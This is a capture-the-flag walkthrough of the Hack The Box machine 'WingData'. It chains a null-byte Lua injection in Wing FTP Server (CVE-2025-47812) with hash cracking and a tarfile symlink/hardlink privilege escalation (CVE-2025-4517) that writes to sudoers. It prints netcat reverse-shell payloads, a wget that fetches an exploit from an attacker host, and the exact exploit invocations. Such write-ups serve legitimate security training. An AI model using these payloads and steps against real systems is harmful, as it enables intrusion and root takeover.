# HTB WingData — CTF Walkthrough & Theory Notes

**Machine:** WingData | **Difficulty:** Easy | **OS:** Linux **CVE:** CVE-2025-47812 (Null Byte RCE) | **Goal:** Capture `user.txt` & `root.txt`

---

## A) Attack Overview

> Full attack chain for both flags:

```
[Scan] nmap finds port 22 (SSH) and port 80 (HTTP)
   ↓
[Enumerate] Web app on port 80 — vhost ftp.wingdata.htb
            Identify Wing FTP Server v7.4.3 (vulnerable version)
   ↓
[Exploit] CVE-2025-47812 — Null Byte Injection in login field
          → Lua code injected into session file on disk
          → Session file executed by server → Reverse shell (wingftp user)
   ↓
[Pivot] Find password hash in Wing FTP user XML files
        → Crack hash with hashcat
        → SSH as local system user (wacky)
   ↓
[USER FLAG] cat /home/wacky/user.txt
   ↓
[Escalate] sudo -l reveals restore_backup_clients.py runnable as root
           → CVE-2025-4517 (Tarfile Symlink + Hardlink Bypass)
           → Malicious tar archive adds wacky to sudoers
           → sudo /bin/bash → root shell
   ↓
[ROOT FLAG] cat /root/root.txt
```

### Tools Reference

|Tool|Purpose|
|---|---|
|`nmap`|Port scan — discover open services and versions|
|`curl` / browser|Web enumeration and vhost discovery|
|`nc`|Catch incoming reverse shell connections|
|`ssh`|Stable authenticated shell access|
|`hashcat`|Offline password hash cracking|
|`python3`|Shell stabilization and local HTTP server|
|`CVE-2025-47812.py`|PoC exploit script — pre-auth RCE on Wing FTP|
|`CVE-2025-4517-POC.py`|PoC exploit script — tarfile privilege escalation|

---

## B) Phase 1 — Reconnaissance

### B.1 — Host File Configuration

```bash
echo "10.129.XX.XX  wingdata.htb ftp.wingdata.htb" >> /etc/hosts
```

Web servers often use virtual hosting — serving different content depending on the `Host:` HTTP header. Without mapping the hostname locally, tools will resolve to the wrong vhost or get a default page that hides the actual application.

---

### B.2 — Nmap Port Scan

**Fast initial scan:**

```bash
nmap -Pn --min-rate 5000 10.129.XX.XX
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Detailed service scan on discovered ports:**

```bash
nmap -Pn -A -p 80,22 10.129.XX.XX
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX (ECDSA)
|_  256 XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: WingData Solutions
```

**Flag Breakdown:**

|Flag|Meaning|
|---|---|
|`-Pn`|Skip host discovery — treat host as up|
|`--min-rate 5000`|Send packets at minimum 5000/sec (fast scan)|
|`-A`|Aggressive scan: OS detection, version, scripts, traceroute|
|`-p 80,22`|Scan only specified ports|

**Findings:**

|Port|Service|Significance|
|---|---|---|
|22|SSH (OpenSSH 9.2p1)|Login target after credential recovery|
|80|HTTP (Apache 2.4.66)|Primary attack surface — web application|

---

### B.3 — Web Enumeration & Version Fingerprinting

Navigate to `http://wingdata.htb` → observe a WingData Solutions landing page.

The page links to a **Client Portal** → redirects to `http://ftp.wingdata.htb/` → Wing FTP Server login page.

**Critical observation:** The page footer or server response reveals `Wing FTP Server v7.4.3`

Version 7.4.3 maps to **CVE-2025-47812** — a pre-authentication Remote Code Execution vulnerability via Null Byte Injection. No credentials are needed to exploit it.

---

## C) Phase 2 — Exploitation (CVE-2025-47812)

### Theory: Null Byte Injection

Null Byte Injection (`\0` / `%00`) exploits a fundamental difference between how languages handle string termination:

|Language / Runtime|Null Byte (`\0`) Behavior|
|---|---|
|C / C++|Terminates a string — everything after `\0` is invisible|
|Lua|Does not treat `\0` as special — reads full buffer|

Wing FTP Server uses C/C++ for its core networking layer but **Lua** as its scripting engine for session logic. This creates a dangerous language boundary.

---

### Theory: Session Files as Code

When a user authenticates, Wing FTP writes a session file to disk in Lua format. When the user requests a page (e.g., `dir.html`), the server calls `dofile()` on that session file — meaning the file is **executed as code**, not merely read as data.

Any Lua syntax injected into the username field gets written to this file and later executed by the interpreter.

---

### Theory: The Null Byte Bypass Mechanism

```
Input:    anonymous%00"]]..os.execute('nc 10.10.XX.XX 5555 -e /bin/sh')..[[
                │
                ▼
C Validator:  reads "anonymous" then stops at \0 → PASSES validation
                │
                ▼
File Write:   writes entire raw buffer to disk
                │
                ▼
Lua dofile(): ignores \0, reads full content → executes os.execute(...)
```

---

### C.1 — Start Netcat Listener

```bash
nc -lvnp 5555
```

---

### C.2 — Clone and Run the PoC

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
cd CVE-2025-47812-poc
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.XX.XX 5555 -e /bin/sh" -v
```

**Output:**

```
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request with command: 'nc 10.10.XX.XX 5555 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: 8bb36760********************************************************************************
[+] Sending GET request to /dir.html with UID: 8bb36760...
[-] Error sending GET request: Read timed out.   ← normal, shell already fired
```

The timeout on the GET request is expected — the shell callback fires before the HTTP response returns.

---

### C.3 — Catch and Stabilize the Shell

**Switch to your nc terminal:**

```
connect to [10.10.XX.XX] from (UNKNOWN) [10.129.XX.XX] 37052
whoami
wingftp
```

**Shell Stabilization:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

---

## D) Phase 3 — Credential Hunting & User Pivot

### D.1 — Find Wing FTP User Files

```bash
cd /opt/wftpserver/Data/1/users
ls
```

```
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```

### D.2 — Extract the Password Hash

```bash
cat wacky.xml
```

```xml
<UserName>wacky</UserName>
<Password>32940def********************************************************************************</Password>
```

---

### D.3 — Crack the Hash

Save the hash on your attack machine and crack it with hashcat. The hash is SHA-256 salted with the username (`WingFTP` as salt — mode 1410):

```bash
echo "32940def********************************************************************************:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**

```
32940def********************************************************************************:WingFTP:**************
```

Password: `**************`

---

### D.4 — SSH In as wacky

```bash
ssh wacky@10.129.XX.XX
# Password: **************
```

---

### D.5 — Capture User Flag

```bash
cat /home/wacky/user.txt
```

---

## E) Phase 4 — Privilege Escalation to Root (CVE-2025-4517)

### E.1 — Enumerate Sudo Privileges

```bash
sudo -l
```

**Output:**

```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The user `wacky` can run `restore_backup_clients.py` as root with no password.

---

### E.2 — Inspect the Script

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

Key observations from the script:

- Accepts a `--restore-dir` argument (must start with `restore_`)
- Validates a tag from the directory name (1–24 chars, alphanumeric/underscore only)
- Extracts a tar archive using `tarfile.open(...).extractall(path=staging_dir, filter="data")`
- Extraction runs with **root privileges**

### Theory: CVE-2025-4517 — Tarfile Symlink + Hardlink Bypass

Python's `tarfile` module with `filter="data"` offers partial protection against path traversal, but is still vulnerable to a chained **symlink + hardlink** attack:

|Phase|Action|
|---|---|
|Build nested dirs|Create deep directory structure inside archive|
|Symlink chain|Chain symlinks to traverse up to `/etc`|
|Escape symlink|Final symlink points outside staging directory|
|Hardlink to sudoers|Hardlink targets `/etc/sudoers`|
|Write payload|Sudoers entry granting `wacky ALL=(ALL) NOPASSWD: ALL`|

Because extraction runs as root, the malicious sudoers entry is written to `/etc/sudoers` during tar extraction.

Reference: https://access.redhat.com/security/cve/cve-2025-4517

---

### E.3 — Transfer the PoC to the Target

**On attack machine** — host the exploit file:

```bash
sudo python3 -m http.server 80
```

**On target machine** — download to `/tmp`:

```bash
cd /tmp
wget http://10.10.XX.XX/CVE-2025-4517-POC.py
ls -la
```

PoC source: https://github.com/AzureADTrent/CVE-2025-4517-POC

---

### E.4 — Run the Exploit

```bash
python3 CVE-2025-4517-POC.py
```

**Output:**

```
CVE-2025-4517 Tarfile Exploit
Privilege Escalation via Symlink + Hardlink Bypass

[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================
```

---

### E.5 — Spawn Root Shell

When prompted, confirm spawning a root shell:

```
[?] Spawn root shell now? (y/n): y

[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/tmp#
```

---

### E.6 — Verify Root & Capture Root Flag

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cd ~
ls
```

```
root.txt
```

```bash
cat root.txt
```

Root flag captured — CTF complete.

---

## F) Key Concepts Reference

|Concept|Technical Explanation|
|---|---|
|Null Byte Injection|`\0` terminates C strings but is transparent to Lua — causes validation bypass across language boundary|
|Session Poisoning|Writing attacker-controlled Lua code into server-side session files which are later executed|
|Lua Code Execution|Wing FTP uses `dofile()` to load session state — any Lua syntax in the file runs at load time|
|Pre-Auth RCE|Vulnerability exploitable without valid credentials — maximum severity|
|Hash Cracking|Offline dictionary attack — hashcat mode 1410 for SHA256+salt|
|SSH Key Auth|Stable access after credential recovery|
|Sudo Enumeration|`sudo -l` reveals commands runnable as root — critical privesc check|
|CVE-2025-4517|Python tarfile symlink + hardlink bypass defeats `filter="data"` protection when run as root|
|Tarfile Path Traversal|Malicious archives use symlink chains to write files outside the intended extraction directory|
|Sudoers Injection|Writing `wacky ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers` grants full root access|

---

## G) Quick Command Reference

```bash
# Environment setup
echo "10.129.XX.XX wingdata.htb ftp.wingdata.htb" >> /etc/hosts

# Reconnaissance
nmap -Pn --min-rate 5000 10.129.XX.XX
nmap -Pn -A -p 80,22 10.129.XX.XX

# Exploit — CVE-2025-47812 (Wing FTP RCE)
nc -lvnp 5555
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc
cd CVE-2025-47812-poc
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.XX.XX 5555 -e /bin/sh" -v

# Shell stabilization
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg

# Credential hunting
cat /opt/wftpserver/Data/1/users/wacky.xml

# Hash cracking (attack machine)
echo "HASH:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt

# Stable access
ssh wacky@10.129.XX.XX

# User flag
cat /home/wacky/user.txt

# Privilege escalation — CVE-2025-4517
sudo -l
# On attack machine:
sudo python3 -m http.server 80
# On target:
cd /tmp && wget http://<ATTACKER_IP>/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
# Spawn root shell when prompted, or:
sudo /bin/bash

# Root flag
cat /root/root.txt
```

---

_HTB WingData | CVE-2025-47812 (Null Byte Injection → Lua RCE) + CVE-2025-4517 (Tarfile Privesc) → Root Flag_